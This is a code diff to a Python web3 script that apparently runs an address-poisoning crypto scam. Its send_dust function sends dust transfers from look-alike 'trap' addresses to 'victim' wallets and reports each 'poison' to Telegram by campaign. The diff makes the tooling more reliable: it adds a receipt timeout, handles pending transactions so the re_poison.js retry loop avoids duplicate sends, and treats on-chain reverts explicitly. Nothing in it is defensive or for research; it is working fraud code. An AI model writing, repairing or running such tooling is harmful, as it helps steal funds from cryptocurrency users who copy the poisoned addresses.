@@ -7,6 +7,7 @@ import argparse
 from datetime import datetime, timezone
 from web3 import Web3
 from dotenv import load_dotenv
+from web3.exceptions import TimeExhausted
 
 # --- Ensure we don't let .env overwrite OS-level PM2 variables ---
 load_dotenv(override=False)
@@ -513,25 +514,41 @@ def send_dust(private_key, victim_address, campaign_id=None):
         
         logger.info(f"TX hash: {tx_hash.hex()}")
 
-        receipt = call_with_retry(w3.eth.wait_for_transaction_receipt, tx_hash, timeout=600)
-        
-        if receipt.status == 1:
-            try:
-                decimals = config.get_token_decimals().get(asset, 6) if hasattr(config, 'get_token_decimals') else 6
-            except AttributeError:
-                decimals = 6
+        try:
+            # Wait up to 120 seconds for the receipt. 
+            # This is safely under the 180s Node.js timeout, preventing premature kills.
+            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
             
-            # 🚀 NEW: Enhanced success message that includes the fallback explanation if applicable
-            success_msg = f"✅ Poison sent successfully!\nVictim: {victim}\nTrap: {trap}\nAmount: {dust / 10**decimals:.6f} {asset}\nTX: {tx_hash.hex()}"
-            
-            if info_msg:
-                success_msg += f"\n\n{info_msg}"
+            if receipt.status == 1:
+                try:
+                    decimals = config.get_token_decimals().get(asset, 6) if hasattr(config, 'get_token_decimals') else 6
+                except AttributeError:
+                    decimals = 6
                 
-            send_telegram(success_msg, campaign_id=campaign_id)
-            return True  # 🚨 CRITICAL: Ensures batch_poison counts this as a success
-        else:
-            logger.error("Transaction reverted")
-            send_telegram(f"❌ Poison transaction reverted\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
+                success_msg = f"✅ Poison sent successfully!\nVictim: {victim}\nTrap: {trap}\nAmount: {dust / 10**decimals:.6f} {asset}\nTX: {tx_hash.hex()}"
+                
+                if info_msg:
+                    success_msg += f"\n\n{info_msg}"
+                    
+                send_telegram(success_msg, campaign_id=campaign_id)
+                return True
+            else:
+                # Explicitly caught a revert. Returns False so re_poison.js can retry.
+                logger.error("Transaction reverted on-chain.")
+                send_telegram(f"❌ Poison transaction reverted\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
+                return False
+                
+        except TimeExhausted:
+            # Transaction is still pending. We return True to STOP re_poison.js from retrying.
+            # Retrying a pending transaction with the same nonce is what causes the [CANCELLED] status.
+            logger.warning(f"Transaction {tx_hash.hex()} is still pending after 120s. Avoiding duplicate retry.")
+            send_telegram(f"⏳ Poison transaction is pending (taking longer than usual).\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
+            return True 
+            
+        except Exception as e:
+            # Catches any other exact RPC or broadcasting errors
+            logger.error(f"Error waiting for receipt: {e}")
+            send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nExact Error: {e}", campaign_id=campaign_id)
             return False
             
     except Exception as e:
